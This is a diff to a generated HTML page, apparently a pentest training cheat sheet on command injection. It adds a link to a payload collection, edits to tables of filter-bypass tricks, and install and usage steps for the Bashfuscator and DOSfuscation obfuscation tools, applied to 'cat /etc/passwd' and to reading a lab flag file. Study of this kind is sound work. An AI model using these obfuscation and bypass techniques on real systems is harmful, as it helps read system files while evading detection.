@@ -686,6 +686,39 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#evasion-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evasion Tools
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Evasion Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#linux-bashfuscator" class="md-nav__link">
+    <span class="md-ellipsis">
+      Linux (Bashfuscator)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows-dosfuscation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows (DOSfuscation)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -1271,6 +1304,39 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#evasion-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evasion Tools
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Evasion Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#linux-bashfuscator" class="md-nav__link">
+    <span class="md-ellipsis">
+      Linux (Bashfuscator)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows-dosfuscation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows (DOSfuscation)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -1288,6 +1354,7 @@
 
 
 <h1 id="command-injections">Command Injections</h1>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection">PayloadAllTheThings Command Injection</a></p>
 <h2 id="injection-operators">Injection Operators</h2>
 <table>
 <thead>
@@ -1377,7 +1444,7 @@
 </tr>
 <tr>
 <td><code>{ls,-la}</code></td>
-<td>Commas will be replaced with spaces</td>
+<td>Bash brace exspansion (commas will be replaced with spaces)</td>
 </tr>
 <tr>
 <td><strong>Other Characters</strong></td>
@@ -1393,7 +1460,7 @@
 </tr>
 <tr>
 <td><code>$(tr '!-}' '"-~'&lt;&lt;&lt;[)</code></td>
-<td>Shift character by one ([ -&gt; )</td>
+<td>Shift character by one "[" (91) -&gt; "\" (92)</td>
 </tr>
 </tbody>
 </table>
@@ -1447,7 +1514,7 @@
 <td></td>
 </tr>
 <tr>
-<td><code>echo -n 'cat /etc/passwd | grep 33' | base64</code></td>
+<td><code>echo -n 'cat /etc/passwd \| grep 33' \| base64</code></td>
 <td>Encode a string with base64</td>
 </tr>
 <tr>
@@ -1550,11 +1617,39 @@
 <td>Encode a string with base64</td>
 </tr>
 <tr>
+<td><code>echo -n whoami \| iconv -f utf-8 -t utf-16le \| base64</code></td>
+<td>Base 64 encode with linux to be decoded on windows</td>
+</tr>
+<tr>
 <td><code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"</code></td>
 <td>Execute b64 encoded string</td>
 </tr>
 </tbody>
 </table>
+<h2 id="evasion-tools">Evasion Tools</h2>
+<h3 id="linux-bashfuscator">Linux (Bashfuscator)</h3>
+<p>https://github.com/Bashfuscator/Bashfuscator</p>
+<pre><code class="language-bash">git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+pip3 install setuptools==65
+python3 setup.py install --user
+cd ./bashfuscator/bin/
+./bashfuscator -h ## show help screen
+./bashfuscator -c 'cat /etc/passwd' ## random choice obfuscation technique
+./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 ## short and simple obfuscated command
+</code></pre>
+<h3 id="windows-dosfuscation">Windows (DOSfuscation)</h3>
+<p>https://github.com/danielbohannon/Invoke-DOSfuscation</p>
+<pre><code class="language-PowerShell">git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+cd Invoke-DOSfuscation
+Import-Module .\Invoke-DOSfuscation.psd1
+Invoke-DOSfuscation
+Invoke-DOSfuscation&gt; help ## show help screen
+Invoke-DOSfuscation&gt; SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
+Invoke-DOSfuscation&gt; encoding
+Invoke-DOSfuscation\Encoding&gt; 1 ## encode type 1 
+</code></pre>
+<p>Run windows powershell on linux with <a href="https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-linux?view=powershell-7.5">pwsh</a></p>
 
 
 
